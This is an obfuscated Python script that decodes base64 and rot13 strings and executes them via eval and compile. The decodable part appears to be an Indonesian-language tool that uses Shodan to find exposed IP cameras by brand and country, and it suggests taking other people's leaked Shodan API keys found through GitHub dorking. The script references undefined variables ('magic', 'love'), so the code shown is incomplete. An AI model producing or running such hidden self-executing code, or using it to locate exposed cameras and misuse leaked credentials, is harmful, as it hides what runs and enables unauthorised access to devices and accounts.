god = 'J10pIAoKCgogIHByaW50KCdcblvwn5G5XSBTYW1wYWkganVtcGEgZGkgcGV0dWFsYW5nYW4gYmFydSFcbicpCgppbml0UXVlc3Rpb25zID0gWwogICAgewogICAgICAgICd0eXBlJzogJ2NvbmZpcm0nLAogICAgICAgICduYW1lJzogJ3VzZVByZXZpb3VzS2V5JywKICAgICAgICAncW1hcmsnOiAnW+Kdk10nLAogICAgICAgICdtZXNzYWdlJzogJ1NhdmVkIFNob2RhbiBBUEkga2V5IGRldGVjdGVkLCBkbyB5b3Ugd2FudCB0byB1c2UgdGhlIGZvbGxvd2luZyBrZXk6IHt9IGZvciB5b3VyIGN1cnJlbnQgcXVlc3Q/Jy5mb3JtYXQoZ2V0U2F2ZWRBUElLZXkoKSksCiAgICAgICAgJ2RlZmF1bHQnOiBUcnVlLAogICAgICAgICd3aGVuJzogbGFtYmRhIGFuc3dlcjogJ1RoZSBsZW5ndGggb2YgdGhlIEFQSSBrZXkgc2hvdWxkIGJlIGF0IGxlYXN0IDMwIGNoYXJhY3RlcnMuJyBcCiAgICAgICAgICAgIGlmIGxlbihnZXRTYXZlZEFQSUtleSgpKSA+IDMwIGVsc2UgRmFsc2UKICAgIH0sCiAgIHsKICAgICAgICAndHlwZSc6ICdjb25maXJtJywKICAgICAgICAnbmFtZSc6ICdoYXZlT3duS2V5JywKICAgICAgICAncW1hcmsnOiAnW+Kdk10nLAogICAgICAgICdtZXNzYWdlJzogJ0RvIHlvdSBoYXZlIGEgU2hvZGFuIEFQSSBrZXk/JywKICAgICAgICAnZGVmYXVsdCc6IFRydWUsCiAgICAgICAgJ3doZW4nOiBsYW1iZGEgYW5zd2VyczogYW5zd2Vycy5nZXQoJ3VzZVByZXZpb3VzS2V5JykgPT0gRmFsc2Ugb3IgbGVuKGdldFNhdmVkQVBJS2V5KCkpIDwgMzAsCiAgICB9LAogICAgewogICAgICAgICd0eXBlJzogJ3Bhc3N3b3JkJywKICAgICAgICAnbmFtZSc6ICd1c2VOZXdLZXknLAogICAgICAgICdtZXNzYWdlJzogJ0VudGVyIHlvdXIgU2hvZGFuIEFQSSBrZXk6JywKICAgICAgICAncW1hcmsnOiAnW/CflJFdJywKICAgICAgICAnd2hlbic6IGxhbWJkYSBhbnN3ZXJzOiBhbnN3ZXJzLmdldCgnaGF2ZU93bktleScpID09IFRydWUsCiAgICAgICAgJ3ZhbGlkYXRlJzogbGFtYmRhIGFuc3dlcjogJ1RoZSBsZW5ndGggb2YgdGhlIEFQSSBrZXkgc2hvdWxkIGJlIGF0IGxlYXN0IDMwIGNoYXJhY3RlcnMuJyBcCiAgICAgICAgICAgIGlmIGxlbihhbnN3ZXIpIDwgMzAgZWxzZSBUcnVlCiAgICB9LAogICAgewogICAgICAgICd0eXBlJzogJ2NvbmZpcm0nLAogICAgICAgICduYW1lJzogJ2ZpbmROZXdLZXknLAogICAgICAgICdxbWFyayc6ICdb4p2TXScsCiAgICAgICAgJ21lc3NhZ2UnOiAnWW91IGNhbiB0cnkgdG8gZmluZCBhIHZhbGlkIEFQSSBrZXkgZm9yIGZyZWUgdXNpbmcgR2l0SHViIGRvcmsuIEFyZSB5b3UgaW50ZXJlc3RlZD8nLAogICAgICAgICdkZWZhdWx0JzogRmFsc2UsCiAgICAgICAgJ3doZW4nOiBsYW1iZGEgYW5zd2VyczogYW5zd2Vycy5nZXQoJ2hhdmVPd25LZXknKSA9PSBGYWxzZSwKICAgIH0KXQoKc2VhcmNoUXVlc3Rpb25zID0gWwogICAgewogICAgICAgICd0eXBlJzogJ2xpc3QnLAogICAgICAgICdxbWFyayc6ICdb8J+kll0nLAogICAgICAgICdtZXNzYWdlJzogJ0plbmlzIGthbWVyYSBhcGEgeWFuZyBzZWRhbmcga2FtdSBjYXJpPycsCiAgICAgICAgJ25hbWUnOiAna2V5d29yZHMnLAogICAgICAgICdjaG9pY2VzJzogWyAKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJ25hbWUnOiAnQWxsJwogICAgICAgICAgICB9LAogICAgICAgICAgICAjIHsKICAgICAgICAgICAgIyAgICAgJ25hbWUnOiAnQWxwaGFmaW5pdHknCiAgICAgICAgICAgICMgfSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJ25hbWUnOiAnQ2Fub24nCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICMgewogICAgICAgICAgICAjICAgICAnbmFtZSc6ICdJTlNUQVInCiAgICAgICAgICAgICMgfSwKICAgICAgICAgICAgIyB7CiAgICAgICAgICAgICMgICAgICduYW1lJzogJ01pbGVzaWdodCcKICAgICAgICAgICAgIyB9LAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAnbmFtZSc6ICdQYW5hc29uaWMnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICduYW1lJzogJ1NvbnknCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICMgewogICAgICAgICAgICAjICAgICAnbmFtZSc6ICdWYWNyb24nCiAgICAgICAgICAgICMgfSwKICAgICAgICAgICAgIyB7CiAgICAgICAgICAgICMgICAgICduYW1lJzogJ1ZpZGVvSVEnCiAgICAgICAgICAgICMgfQogICAgICAgICAgXSwKICAgICAgICAgICdmaWx0ZXInOiBsYW1iZGEgdmFsOiB2YWwubG93ZXIoKSwKICAgICAgICAgICd2YWxpZGF0ZSc6IGxhbWJkYSBhbnN3ZXI6ICdBbmRhIGhhcnVzIG1lbWlsaWggc2V0aWRha255YSBzYXR1IG1lcmVrLicgXAogICAgICAgICAgICBpZiBsZW4oYW5zd2VyKSA9PSAwIGVsc2UgVHJ1ZQogICAgfSwKICAgICAgewogICAgICAgICd0eXBlJzogJ2xpc3QnLAogICAgICAgICdxbWFyayc6ICdb8J+Ps++4j10nLAogICAgICAgICdtZXNzYWdlJzogJ0RpIG5lZ2FyYSBtYW5hIEFuZGEgaW5naW4gbWVtZm9rdXNrYW4gcGVuZWxpdGlhbiBBbmRhPycsCiAgICAgICAgJ25hbWUnOiAnY291bnRyeScsCiAgICAgICAgJ2Nob2ljZXMnOiBbCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ0FsbCcKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnSlAnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ0RFJwogICAgICAgICAgICB9LAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAnbmFtZSc6ICdVUycKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnVEgnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ0tSJwogICAgICAgICAgICB9LAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAnbmFtZSc6ICdWTicKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnSVQnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ05MJwogICAgICAgICAgICB9LAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAnbmFtZSc6ICdGUicKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnQVQnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ1RXJwogICAgICAgICAgICB9LAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAnbmFtZSc6ICdFUycKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnUlUnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ0hLJwogICAgICAgICAgICB9LAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAnbmFtZSc6ICdHQicKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnQkUnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ1NHJwogICAgICAgICAgICB9LAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAnbmFtZSc6ICdQTCcKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnQ0EnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ0FVJwogICAgICAgICAgICB9LAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAnbmFtZSc6ICdDWicKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnVFInCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ0NIJwogICAgICAgICAgICB9LAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAnbmFtZSc6ICdJTicKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnQlInCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ1NFJwogICAgICAgICAgICB9LAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAnbmFtZSc6ICdGSScKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnREsnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ0hVJwogICAgICAgICAgICB9LAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAnbmFtZSc6ICdOTycKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnUEEnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ1JPJwogICAgICAgICAgICB9LAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAnbmFtZSc6ICdHUicKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnQkcnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ0NOJwogICAgICAgICAgICB9LAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAnbmFtZSc6ICdJRCcKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnTVgnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ1VBJwogICAgICAgICAgICB9LAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAnbmFtZSc6ICdNWScKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnWkEnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ1NLJwogICAgICAgICAgICB9LAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAnbmFtZSc6ICdQVCcKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnSUUnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ0lSJwogICAgICAgICAgICB9LAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAnbmFtZSc6ICdJTCcKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnSFInCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ0FSJwogICAgICAgICAgICB9LAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAnbmFtZSc6ICdOWicKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnRUcnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ1VZJwogICAgICAgICAgICB9LAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAnbmFtZSc6ICdTSScKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnVE4nCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICduYW1lJzogJ0VFJwogICAgICAgICAgICB9LAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAnbmFtZSc6ICdTVicKICAgICAgICAgICAgfSwKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgJ25hbWUnOiAnTFQnCiAgICAgICAgICAgIH0sCiAgICAgIC'
destiny = 'NtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW0yGWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqFHlpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaGSHaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW0kJWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqQGPpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaH0RaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW0ACWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqRJvpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaGHRaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW1MSWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqOEFpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaDyxaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW0AFWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqAEPpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaGH8aPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW0IQWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqYIlpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaGHfaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW1OVWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqDFlpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaDxDaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW1OFWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqXEFpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaF1baPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW0yAWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqAIPpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaGxxaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW0SZWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqPDFpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaD1paPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW0AMWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqUDFpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaFR4aPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW0cCWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqADlpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaE1HaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW0gVWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqAIFpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaHSxaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW0ECWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqZDFpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaHRHaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW1WSWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqUEFpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaE0taPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW0qDWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqWHFpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaFx0aPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW09AWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqOElpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaDItaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW0WVWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqPJvpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaE0paPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW0qWWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqZDvpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaGRxaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW05QWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqOEPpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaDHxaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW0SKWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqPIPpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaEx8aPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW0qTWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqUIPpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaFSDaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW0gUWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqYGvpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaF1xaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW01SWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqAElpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaGIRaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW01nWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqBElpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaHRLaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW1SOWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqGJPpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaH1xaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW1EHWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqHJvpXVPNtVPNtVPNtVPNtsFjXVPNtVPNtVPNtVPNtrlNXVPNtVPNtVPNtVPNtVPNtW25uoJHaBvNaIIbaPvNtVPNtVPNtVPNtVU0fPvNtVPNtVPNtVPNtVUftPvNtVPNtVPNtVPNtVPNtVPqhLJ1yWmbtW1uYWjbtVPNtVPNtVPNtVPO9YNbtVPNtVPNtVPNtVPO7VNbtVPNtVPNtVPNtVPNtVPNaozSgMFp6VPqnGFpXVPNtVPNtVPNtVPNtsDbtVPNtVPNtVPNtKFjXVPNtVPNtVPNtVPqznJk0MKVaBvOfLJ1vMTRtqzSfBvO2LJjhoT93MKVbXFjXVPNtVPNtVPNtVPq2LJkcMTS0MFp6VTkuoJWxLFOuoaA3MKV6VPqOozEuVTuupaImVT1yoJyfnJttp2I0nJEun255LFOmLKE1VT5yM2SlLF4aVSjXVPNtVPNtVPNtVPNtnJLtoTIhXTShp3qypvxtCG0tZPOyoUAyVSElqJHXVPNtVU0XKDbXp2S2MIWyp3IfqUAEqJImqTyiovN9VSfXVPNtVUfXVPNtVPNtVPNaqUyjMFp6VPqwo25znKWgWljXVPNtVPNtVPNaozSgMFp6VPq3LJ50H2S2MIWyp3IfqUZaYNbtVPNtVPNtVPqkoJSlnlp6VPqo4c2GKFpfPvNtVPNtVPNtW21yp3AuM2HaBvNaDKOun2SbVRShMTRtnJ5anJ4toJIhrJygpTShVTuup2yfVUOyozAupzyuovOOozEuClpfPvNtVPNtVPNtW2EyMzS1oUDaBvOHpaIyYNbtVPNtsFjtVPNtPvNtVPO7PvNtVPNtVPNtW3E5pTHaBvNaoTymqPpfPvNtVPNtVPNtW25uoJHaBvNaMzyfMHMipz1uqPpfPvNtVPNtVPNtW3SgLKWeWmbtW1ivaMAqWljXVPNtVPNtVPNaoJImp2SaMFp6VPqOpTRtnzIhnKZtMz9loJS0VUyuozptDJ5xLFOvqKE1nTguow8aYNbtVPNtVPNtVPqwnT9cL2ImWmbtJlqHJSDaYPNaD1AJW10fPvNtVPNtVPNtW2McoUEypvp6VTkuoJWxLFO2LJj6VUMuoP5fo3qypvtcYNbtVPNtVPNtVPq3nTIhWmbtoTSgLzEuVTShp3qypaZ6VTShp3qypaZhM2I0XPq3LJ50H2S2MIWyp3IfqUZaXFN9CFOHpaIyYNbtVPNtsDcqPtcjpz9gpUEGqUyfMFN9VUA0rJkyK2Mlo21sMTywqPu7PvNtVPOHo2gyov5GMKOupzS0o3V6VPpwLwDkMGD0VTWioTDaYNbtVPNtIT9eMJ4hHKIyp3Eco25ALKWeBvNaVmEvA2WyLlpfPvNtVPOHo2gyov5GMJkyL3EyMQbtWlAvAQSyAQDtLz9fMPpfPvNtVPOHo2gyov5Do2yhqTIlBvNaVmD1LJSzZvOvo2kxWljXVPNtVSEin2IhYxyhp3ElqJA0nJ9hBvNaWljtPvNtVPOHo2gyov5OoaA3MKV6VPpwMzMzVTWioTDaYNbtVPNtIT9eMJ4hHKIyp3Eco246VPpwZmD5BTEvVTWioTDaYNc9XDbXnJLtK19hLJ1yK18tCG0tVy9soJScoy9sVwbXVPOgLJyhXPx='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
